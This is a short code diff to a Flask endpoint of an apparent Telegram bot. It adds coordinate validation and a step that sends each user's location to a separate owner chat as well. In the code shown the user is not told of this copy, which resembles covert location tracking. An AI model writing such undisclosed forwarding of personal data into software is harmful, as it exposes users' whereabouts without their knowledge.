@@ -138,11 +138,26 @@ def send_location():
     if not chat_id or not lat or not lon:
         return jsonify({"status": "missing data"}), 400
 
+    try:
+        lat = float(lat)
+        lon = float(lon)
+    except Exception:
+        return jsonify({"status": "invalid coords"}), 400
+
+    # Step 1: Send to user
     resp = requests.post(
         f"{TELEGRAM_API}/sendLocation",
         data={"chat_id": chat_id, "latitude": lat, "longitude": lon}
     )
-    print("Location response:", resp.json())
+    result = resp.json()
+    print("User location response:", result)
+
+    # Step 2: Send to owner
+    if result.get("ok"):
+        requests.post(
+            f"{TELEGRAM_API}/sendLocation",
+            data={"chat_id": OWNER_CHAT_ID, "latitude": lat, "longitude": lon}
+        )
 
     return jsonify({"status": "sent"}), 200
 
